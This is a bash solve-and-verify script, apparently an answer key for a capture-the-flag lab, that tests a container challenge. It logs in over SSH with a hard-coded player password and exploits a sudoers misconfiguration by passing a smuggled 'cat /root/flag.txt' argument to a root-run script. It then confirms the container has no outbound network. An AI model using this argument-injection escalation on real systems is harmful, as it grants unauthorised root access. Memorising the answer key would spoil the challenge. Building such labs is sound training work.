#!/bin/bash
# CH6 Part B - solve/verify script (used for FT-02 functional testing).
# Run AFTER ./build.sh has brought the container up.
#
# Reproduces the intended player path end-to-end over SSH:
#   1. Log in with the Part A credential.
#   2. sudo -l to discover the misconfigured rule.
#   3. Use the vulnerable script's argument passthrough to read the flag.
#   4. Confirm the escalation is confined to the container (no host impact) - ST-03.
#
# Usage: CH6_PLAYER_PASSWORD="gh0st_1n_th3_w1r3" ./solve_verify.sh

set -euo pipefail
: "${CH6_PLAYER_PASSWORD:?Set CH6_PLAYER_PASSWORD}"

SSH="sshpass -p ${CH6_PLAYER_PASSWORD} ssh -p 2222 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null player@localhost"

echo "--- sudo -l (should show the single unrestricted rule) ---"
$SSH "sudo -l"

echo
echo "--- exploiting the sudoers misconfiguration to read the flag ---"
$SSH "sudo /opt/novagrid/logrotate_check.sh 'cat /root/flag.txt'"

echo
echo "--- ST-03 sanity: confirm player has no route out of the container ---"
$SSH "ping -c1 -W1 8.8.8.8 || echo 'no outbound connectivity - OK (internal: true network)'"
